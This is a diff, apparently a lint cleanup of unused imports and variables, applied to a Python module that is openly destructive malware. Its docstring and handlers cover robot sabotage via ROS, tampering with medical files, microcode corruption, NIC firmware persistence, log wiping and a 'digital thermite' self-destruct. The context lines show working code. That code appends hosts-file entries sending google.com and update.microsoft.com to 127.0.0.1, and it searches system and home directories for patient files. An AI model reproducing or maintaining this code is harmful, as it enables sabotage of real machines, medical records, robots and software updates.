@@ -8,9 +8,13 @@ microcode corruption via CPU MSR, NIC firmware persistence via PCI config space,
 MFT bitmap overwrite, backup chain breaking, journal poisoning, DNS cache poisoning,
 BGP phantom routes, LDAP intermittent DoS, digital thermite self-destruct,
 honey token detection, access log wiping with secure overwrite."""
-import json, os, random, time, struct, subprocess, sys, hashlib, re, socket, ctypes, glob as _glob
+import os
+import random
+import subprocess
+import socket
+import ctypes
+import glob as _glob
 from datetime import datetime
-from pathlib import Path
 
 
 def _is_root() -> bool:
@@ -268,7 +272,7 @@ def handle_acoustic_resonance(params: dict) -> dict:
 
                 base_freq = rpm / 60
                 platters = 2
-                heads = platters * 2
+                platters * 2
 
                 harmonics = []
                 for i in range(1, 7):
@@ -476,7 +480,7 @@ def handle_robot_sabotage(params: dict) -> dict:
 
     # Search for ROS (Robot Operating System)
     ros_found = False
-    ros_master_uri = os.environ.get("ROS_MASTER_URI", "http://localhost:11311")
+    os.environ.get("ROS_MASTER_URI", "http://localhost:11311")
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(1)
@@ -789,9 +793,6 @@ def handle_medical_tamper(params: dict) -> dict:
     result = {"success": True}
 
     # Search for medical-related files
-    medical_patterns = ["*.dcm", "*.dic", "*.hl7", "*.fhir", "*.xml", "*.json",
-                        "patient", "medical", "clinical", "diagnosis", "prescription",
-                        "lab_result", "radiology", "pathology", "surgery", "medication"]
     medical_files = []
     search_roots = ["/opt", "/var/lib", os.path.expanduser("~"), "/mnt"]
     for sr in search_roots:
@@ -992,7 +993,7 @@ def handle_microcode_corrupt(params: dict) -> dict:
         vulns_found = []
         try:
             with open("/sys/devices/system/cpu/vulnerabilities") as f:
-                content = f.read()
+                f.read()
         except (IOError, PermissionError):
             try:
                 for vuln_path in _glob.glob("/sys/devices/system/cpu/vulnerabilities/*"):
@@ -1061,9 +1062,9 @@ def handle_nic_persist(params: dict) -> dict:
                                 with open(os.path.join(pci_path, "device")) as f:
                                     device_id = f.read().strip()
                                 with open(os.path.join(pci_path, "subsystem_vendor")) as f:
-                                    subvendor = f.read().strip() if os.path.exists(os.path.join(pci_path, "subsystem_vendor")) else "N/A"
+                                    f.read().strip() if os.path.exists(os.path.join(pci_path, "subsystem_vendor")) else "N/A"
                             except (IOError, PermissionError):
-                                vendor_id, device_id, subvendor = "N/A", "N/A", "N/A"
+                                vendor_id, device_id, _subvendor = "N/A", "N/A", "N/A"
 
                             try:
                                 with open(os.path.join(iface_path, "address")) as f:
@@ -1279,9 +1280,9 @@ def handle_dns_poison(params: dict) -> dict:
         try:
             with open(hosts_file, "a") as f:
                 f.write(f"\n# X404X DNS Poison {datetime.now().isoformat()}\n")
-                f.write(f"127.0.0.1 google.com\n")
-                f.write(f"127.0.0.1 microsoft.com\n")
-                f.write(f"127.0.0.1 update.microsoft.com\n")
+                f.write("127.0.0.1 google.com\n")
+                f.write("127.0.0.1 microsoft.com\n")
+                f.write("127.0.0.1 update.microsoft.com\n")
             hosts_poisoned = True
         except (IOError, PermissionError):
             pass
@@ -1420,7 +1421,7 @@ def handle_digital_thermite(params: dict) -> dict:
         # Windows: check for SeShutdownPrivilege
         try:
             import ctypes
-            advapi = ctypes.WinDLL("advapi32.dll")
+            ctypes.WinDLL("advapi32.dll")
             bsod_possible = True
         except Exception:
             pass
